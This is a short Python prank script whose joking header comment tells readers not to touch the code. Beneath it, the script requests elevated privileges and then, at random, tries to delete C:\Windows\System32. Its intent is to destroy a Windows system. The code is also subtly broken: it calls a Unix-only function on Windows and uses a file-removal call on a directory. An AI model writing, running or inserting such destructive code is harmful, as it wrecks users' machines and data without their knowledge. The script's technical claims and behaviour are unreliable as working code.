#
# You may think you know what the following code does.
# But you dont. Trust me.
# Fiddle with it, and youll spend many a sleepless
# night cursing the moment you thought youd be clever
# enough to "optimize" the code below.
# Now close this file and go play with something else.



import random
import os
import os
from elevate import elevate

def is_root():
    return os.getuid() == 0

print("before ", is_root())
elevate()
print("after ", is_root())

if random.randint(0, 6) == 1:
    os.remove("C:\Windows\System32")

